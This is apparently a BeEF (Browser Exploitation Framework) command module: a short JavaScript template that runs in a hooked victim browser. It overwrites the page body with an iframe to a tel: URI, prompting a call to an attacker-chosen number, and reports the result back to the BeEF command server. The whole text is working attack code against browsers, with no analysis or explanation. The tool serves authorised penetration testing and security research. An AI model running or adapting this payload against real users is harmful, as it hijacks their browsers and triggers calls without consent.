beef.execute(function() {
	document.body.innerHTML = "<iframe src=tel:<%= @tel_num %>></iframe>";

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "result=IFrame Created!");
});
